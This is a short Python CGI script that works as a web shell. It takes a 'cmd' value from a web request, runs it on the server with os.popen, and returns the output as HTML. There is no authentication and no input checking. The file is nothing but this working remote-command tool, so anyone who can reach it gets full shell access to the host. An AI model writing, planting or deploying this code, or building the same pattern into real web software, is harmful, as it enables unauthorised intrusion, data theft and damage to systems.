import os
import cgi

print("Content-type: text/html\n\n")
print("<html><body>")

form = cgi.FieldStorage()

if "cmd" in form:
    cmd = form.getvalue("cmd")
    output = os.popen(cmd).read()
    print("<pre>{}</pre>".format(output))

print("</body></html>")